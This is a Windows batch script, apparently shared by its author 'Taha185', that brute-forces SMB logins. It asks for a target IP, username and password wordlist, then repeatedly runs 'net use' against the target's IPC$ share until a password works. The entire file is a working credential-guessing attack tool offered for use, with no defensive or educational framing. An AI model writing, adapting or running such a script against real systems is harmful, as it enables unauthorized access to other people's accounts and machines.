@echo off
title Login Brute-Forcer by Taha185
cls

:: Display header with color
color 0A
echo -------------------------------
echo       LOGIN BRUTE-FORCER       
echo -------------------------------
echo  Created by Taha185 - Use at your own risk.
timeout /t 2 >nul
cls

:: Introduction
echo [*] Let's get to action!
timeout /t 2 >nul
cls

echo ---------------------------
set /p ip="Target IP: "
set /p user="Target username: "
set /p wordlist="Password list file (e.g., C:\path\to\wordlist.txt): "
echo ---------------------------

:: Check if the wordlist file exists
if not exist "%wordlist%" (
    color 0C
    echo ERROR: Wordlist file not found!
    timeout /t 2 >nul
    exit /b
)

:: Loop through each line (password) in the wordlist
echo ---------------------------
echo Starting brute-force attempts...
timeout /t 1 >nul
color 0E

for /f "tokens=*" %%p in (%wordlist%) do (
    set pass=%%p
    call :attempt_login
)

:: End
color 0C
echo ---------------------------
echo Brute-forcing complete.
pause
exit

:attempt_login
:: Show the attempt with fancy formatting
echo [*] Trying password: %pass%
net use \\%ip%\ipc$ %pass% /user:%user% >nul 2>&1

:: Check if the login was successful or failed
if %errorlevel% == 0 (
    color 0A
    echo [+] Success! Password found: %pass%
    exit /b
) else (
    color 0C
    echo [-] Failed with password: %pass%
)

goto :eof
